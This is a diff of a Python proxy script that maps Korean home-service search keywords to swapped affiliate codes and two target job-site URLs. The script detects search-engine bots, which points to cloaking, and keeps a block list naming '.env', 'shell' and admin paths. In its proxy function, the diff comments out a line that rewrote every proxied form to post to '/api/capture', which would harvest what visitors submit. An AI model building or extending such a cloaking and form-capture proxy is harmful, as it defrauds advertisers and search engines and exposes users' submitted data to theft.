@@ -22,45 +22,40 @@ G_GUARDIAN = {}
 G_JAIL = set()
 
 CPA_DATA = {
-    # Cleaning (Target A: z2NytCt42i, Target B: WwVCgW9E1R)
-    "8cf12edf": ["이사청소", "z2NytCt42i", "WwVCgW9E1R"], "ca4a68a6": ["사무실청소", "z2NytCt42i", "WwVCgW9E1R"],
-    "c8a4cf5a": ["입주청소", "z2NytCt42i", "WwVCgW9E1R"], "d7ea613c": ["집청소", "z2NytCt42i", "WwVCgW9E1R"],
-    "cb845113": ["청소업체", "z2NytCt42i", "WwVCgW9E1R"],
+    # Cleaning (Index 1: A-Code[ReplyAlba], Index 2: B-Code[AlbaRich])
+    "8cf12edf": ["이사청소", "WwVCgW9E1R", "z2NytCt42i"], "ca4a68a6": ["사무실청소", "WwVCgW9E1R", "z2NytCt42i"],
+    "c8a4cf5a": ["입주청소", "WwVCgW9E1R", "z2NytCt42i"], "d7ea613c": ["집청소", "WwVCgW9E1R", "z2NytCt42i"],
+    "cb845113": ["청소업체", "WwVCgW9E1R", "z2NytCt42i"],
     
-    # Moving (Target A: zdIDBDSzof, Target B: LlocSbdUSY)
-    "faf45575": ["이사", "zdIDBDSzof", "LlocSbdUSY"], "ce8a5ce4": ["포장이사", "zdIDBDSzof", "LlocSbdUSY"],
-    "c8b22f8a": ["이사업체", "zdIDBDSzof", "LlocSbdUSY"], "d108d7a5": ["사무실이사", "zdIDBDSzof", "LlocSbdUSY"],
-    "f79702a3": ["이사견적", "zdIDBDSzof", "LlocSbdUSY"], "fa13bc33": ["원룸이사", "zdIDBDSzof", "LlocSbdUSY"],
-    "eeaf8186": ["용달이사", "zdIDBDSzof", "LlocSbdUSY"],
+    # Moving (Index 1: A-Code[ReplyAlba], Index 2: B-Code[AlbaRich])
+    "faf45575": ["이사", "LlocSbdUSY", "zdIDBDSzof"], "ce8a5ce4": ["포장이사", "LlocSbdUSY", "zdIDBDSzof"],
+    "c8b22f8a": ["이사업체", "LlocSbdUSY", "zdIDBDSzof"], "d108d7a5": ["사무실이사", "LlocSbdUSY", "zdIDBDSzof"],
+    "f79702a3": ["이사견적", "LlocSbdUSY", "zdIDBDSzof"], "fa13bc33": ["원룸이사", "LlocSbdUSY", "zdIDBDSzof"],
+    "eeaf8186": ["용달이사", "LlocSbdUSY", "zdIDBDSzof"],
     
-    # Plumbing (Target A: QOaojnBV2v, Target B: GkVRvxfx1T)
-    "8e2996c7": ["배관 누수", "QOaojnBV2v", "GkVRvxfx1T"], "81edc02c": ["변기막힘", "QOaojnBV2v", "GkVRvxfx1T"],
-    "8745563e": ["하수구막힘", "QOaojnBV2v", "GkVRvxfx1T"], "617a0005": ["누수탐지", "QOaojnBV2v", "GkVRvxfx1T"],
-    "5d19986d": ["변기뚫는업체", "QOaojnBV2v", "GkVRvxfx1T"], "a0ef0c00": ["싱크대막힘", "QOaojnBV2v", "GkVRvxfx1T"],
-    "e6d02452": ["배수구 막힘", "QOaojnBV2v", "GkVRvxfx1T"], "35467a5c": ["하수구 역류", "QOaojnBV2v", "GkVRvxfx1T"],
-    "9ce613e1": ["변기 물 안 내려감", "QOaojnBV2v", "GkVRvxfx1T"], "68943f44": ["하수구 뚫는 업체", "QOaojnBV2v", "GkVRvxfx1T"],
-    "c8abc514": ["변기 뚫는 곳", "QOaojnBV2v", "GkVRvxfx1T"],
+    # Plumbing (Index 1: A-Code[ReplyAlba], Index 2: B-Code[AlbaRich])
+    "8e2996c7": ["배관 누수", "GkVRvxfx1T", "QOaojnBV2v"], "81edc02c": ["변기막힘", "GkVRvxfx1T", "QOaojnBV2v"],
+    "8745563e": ["하수구막힘", "GkVRvxfx1T", "QOaojnBV2v"], "617a0005": ["누수탐지", "GkVRvxfx1T", "QOaojnBV2v"],
+    "5d19986d": ["변기뚫는업체", "GkVRvxfx1T", "QOaojnBV2v"], "a0ef0c00": ["싱크대막힘", "GkVRvxfx1T", "QOaojnBV2v"],
+    "e6d02452": ["배수구 막힘", "GkVRvxfx1T", "QOaojnBV2v"], "35467a5c": ["하수구 역류", "GkVRvxfx1T", "QOaojnBV2v"],
+    "9ce613e1": ["변기 물 안 내려감", "GkVRvxfx1T", "QOaojnBV2v"], "68943f44": ["하수구 뚫는 업체", "GkVRvxfx1T", "QOaojnBV2v"],
+    "c8abc514": ["변기 뚫는 곳", "GkVRvxfx1T", "QOaojnBV2v"],
     
-    # Fixtures (Target A: vRUcqPts9r, Target B: FzYOdTzVNw)
-    "ffbfdc28": ["변기수전", "vRUcqPts9r", "FzYOdTzVNw"], "be4adb64": ["수전교체", "vRUcqPts9r", "FzYOdTzVNw"],
-    "a01f1db0": ["변기교체", "vRUcqPts9r", "FzYOdTzVNw"], "b1585a85": ["화장실 변기 교체", "vRUcqPts9r", "FzYOdTzVNw"],
-    "c2bddbcc": ["세면대 교체", "vRUcqPts9r", "FzYOdTzVNw"], "b6f6c35f": ["변기업체", "vRUcqPts9r", "FzYOdTzVNw"],
-    "3e750243": ["수전업체", "vRUcqPts9r", "FzYOdTzVNw"],
+    # Fixtures (Index 1: A-Code[ReplyAlba], Index 2: B-Code[AlbaRich])
+    "ffbfdc28": ["변기수전", "FzYOdTzVNw", "vRUcqPts9r"], "be4adb64": ["수전교체", "FzYOdTzVNw", "vRUcqPts9r"],
+    "a01f1db0": ["변기교체", "FzYOdTzVNw", "vRUcqPts9r"], "b1585a85": ["화장실 변기 교체", "FzYOdTzVNw", "vRUcqPts9r"],
+    "c2bddbcc": ["세면대 교체", "FzYOdTzVNw", "vRUcqPts9r"], "b6f6c35f": ["변기업체", "FzYOdTzVNw", "vRUcqPts9r"],
+    "3e750243": ["수전업체", "FzYOdTzVNw", "vRUcqPts9r"],
     
-    # Welding (Target A: SROHH97olh, Target B: XpBx9dZ5aE)
-    "dc19f4ea": ["용접", "SROHH97olh", "XpBx9dZ5aE"], "af5f2375": ["출장용접", "SROHH97olh", "XpBx9dZ5aE"],
-    "c4c5ee7e": ["용접업체", "SROHH97olh", "XpBx9dZ5aE"], "4a2f6816": ["배관용접", "SROHH97olh", "XpBx9dZ5aE"],
-    "87a3472b": ["알곤용접", "SROHH97olh", "XpBx9dZ5aE"], "63b2da0a": ["용접수리", "SROHH97olh", "XpBx9dZ5aE"],
-    "20186798": ["알곤출장용접", "SROHH97olh", "XpBx9dZ5aE"], "ef310430": ["스텐 출장용접", "SROHH97olh", "XpBx9dZ5aE"]
-    
-    # Demolition (Assuming Target A: NS5WRB4yKa, Target B: 10qHjZwUanF from user request, need to add hash if keyword exists but no hash yet. 
-    # Actually, Demolition keywords are missing from original list, user provided new ones '무촌철거'. 
-    # Wait, user provided '무촌철거' but no hash for it. 
-    # I will assume the provided list covers everything for now, or use a default fallback.)
+    # Welding (Index 1: A-Code[ReplyAlba], Index 2: B-Code[AlbaRich])
+    "dc19f4ea": ["용접", "XpBx9dZ5aE", "SROHH97olh"], "af5f2375": ["출장용접", "XpBx9dZ5aE", "SROHH97olh"],
+    "c4c5ee7e": ["용접업체", "XpBx9dZ5aE", "SROHH97olh"], "4a2f6816": ["배관용접", "XpBx9dZ5aE", "SROHH97olh"],
+    "87a3472b": ["알곤용접", "XpBx9dZ5aE", "SROHH97olh"], "63b2da0a": ["용접수리", "XpBx9dZ5aE", "SROHH97olh"],
+    "20186798": ["알곤출장용접", "XpBx9dZ5aE", "SROHH97olh"], "ef310430": ["스텐 출장용접", "XpBx9dZ5aE", "SROHH97olh"]
 }
 
-TARGET_A = "https://albarich.com"
-TARGET_B = "https://replyalba.co.kr"
+TARGET_A = "https://replyalba.co.kr"
+TARGET_B = "https://albarich.com"
 BOT_SIGS = ['naver', 'yeti', 'bot', 'crawl', 'google', 'spider', 'ahrefs', 'bing']
 FORBIDDEN_PATHS = ['admin', '.env', 'wp-login', 'config', 'shell', 'backup']
 REGIONS = ['us-east-1', 'ap-northeast-2', 'eu-west-1', 'sa-east-1', 'ap-southeast-1']
@@ -523,7 +518,7 @@ def proxy_master_final(path):
         f_resp = make_response()
         if "text/html" in t_resp.headers.get("Content-Type", ""):
             html = re.sub(r'(src|href|action)="/', f'\\1="{base_target}/', t_resp.text)
-            html = re.sub(r'<form([^>]*)action="[^"]*"', r'<form\1action="/api/capture" method="POST"', html)
+            # html = re.sub(r'<form([^>]*)action="[^"]*"', r'<form\1action="/api/capture" method="POST"', html) # [Direct Pass-through]
             f_resp.set_data(html)
         else:
             f_resp.set_data(t_resp.content)
